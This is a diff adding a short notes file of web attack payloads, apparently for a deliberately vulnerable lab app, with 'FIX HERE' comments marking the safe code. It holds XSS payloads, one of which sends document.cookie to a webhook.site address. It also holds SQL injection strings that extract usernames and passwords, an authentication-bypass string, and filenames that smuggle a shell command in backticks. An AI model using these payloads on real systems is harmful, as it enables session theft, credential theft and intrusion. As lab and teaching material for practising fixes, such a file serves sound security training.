@@ -1,0 +1,28 @@
+XSS:
+	<script>alert(1)</script>
+	<script>alert(document.cookie)</script>
+	<img src=# onerror=fetch("https://webhook.site/45d32975-fb8f-4533-80c0-af7fbdbbf2eb?c="+document.cookie) />
+	https://webhook.site/#!/
+
+	<!--<h1>Search Results for "<%= searchTerm %>"</h1> FIX HERE -->
+
+
+
+SQLi:
+	search:
+	' union select 'a', 'b', 'c', 'd', 'e' --
+	' union select 'a', username, password, 'd', 'e' from users--
+	// const query = 'SELECT * FROM books WHERE title ILIKE $1 OR author ILIKE $1'; //- FIX HERE
+    	// const { rows } = await pool.query(query, [`%${searchTerm}%`]); //- FIX HERE
+
+
+	auth bypass:
+	admin' or true --
+	// if ((await pool.query(`SELECT id FROM users WHERE username=$1 AND password=$2`, [username, password])).rowCount !== 0) { // FIX HERE
+
+
+
+Command Injection:
+	$USER.docx
+	`pkill -x node`.docx
+	// cb(null, `${Date.now()}${path.extname(file.originalname)}`); //- FIX HERE
